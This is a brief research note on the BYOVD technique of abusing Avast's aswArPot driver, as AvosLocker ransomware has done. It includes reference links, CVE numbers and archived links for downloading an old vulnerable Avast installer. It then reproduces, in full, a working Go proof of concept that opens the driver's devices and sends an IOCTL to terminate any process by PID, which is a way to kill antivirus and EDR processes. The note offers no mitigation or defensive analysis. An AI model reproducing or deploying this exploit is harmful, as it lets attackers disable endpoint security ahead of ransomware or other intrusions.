Research - BYOVD Avast! Aswarpot  

https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html  
https://cybersecuritynews.com/10-year-old-flaws-with-avast-and-avg/  

Related CVEs  
CVE-2022-26522  
CVE-2022-26523  
CVE-2021-40539

Avast download  
https://www.dell.com/community/en/conversations/virus-spyware/avast-12/647f65f2f4ccf8a8de2c25a3?msockid=14050a922f30675b240c1fa02e9d665e  
https://web.archive.org/web/20170201000000*/http://files.avast.com/iavs9x/avast_free_antivirus_setup_offline.exe  

POC - https://github.com/timwhitez/killProcessPOC/blob/main/aswarpot.go
```  
package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"unsafe"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("./device.exe pid")
		return
	}

	if os.Args[1] == "-h" {
		fmt.Println("./device.exe pid")
		return
	}

	var volumename = fmt.Sprintf("\\\\.\\aswSP_ArPot2")
	hVolume, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	//var local_10 []byte
	var local_1c uint32
	windows.DeviceIoControl(hVolume, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)

	volumename = fmt.Sprintf("\\\\.\\aswSP_Avar")
	local_c, _ := windows.CreateFile(windows.StringToUTF16Ptr(volumename), 0xc0000000, 0, nil, windows.OPEN_EXISTING, 0x80, 0)

	pid, _ := strconv.Atoi(os.Args[1])
	processID := uint32(pid)
	var local_2c uint32
	windows.DeviceIoControl(local_c, 0x9988c094, (*byte)(unsafe.Pointer(&processID)), 4, nil, 0, &local_2c, nil)

	windows.CloseHandle(hVolume)
	windows.CloseHandle(local_c)

}
```  

